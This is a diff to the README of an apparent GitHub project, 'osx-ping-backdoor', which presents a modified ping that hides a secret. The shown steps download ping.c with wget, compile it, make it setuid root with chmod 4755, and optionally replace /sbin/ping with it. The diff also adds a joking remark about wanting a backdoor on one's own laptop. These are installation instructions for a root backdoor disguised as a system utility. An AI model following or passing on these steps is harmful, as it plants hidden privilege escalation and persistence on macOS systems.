@@ -11,8 +11,8 @@ This program still works like the normal `ping`. It just has a little secret ðŸ˜
 
 1. `wget https://raw.githubusercontent.com/raincoats/osx-ping-backdoor/master/ping.c`
 1. `gcc ping.c -o ping`
-2. (as root) `chown root:wheel ./ping; chmod 4755 ./ping`
-3. Optionally, `mv /sbin/ping{,-backup} && mv ./ping /sbin`
+2. `chown root:wheel ./ping; chmod 4755 ./ping`
+3. Optionally, `mv /sbin/ping{,-backup} && mv ./ping /sbin` (but I mean, really, are you sure you want a backdoor on your smackbook throw?)
 
 # Usage
 
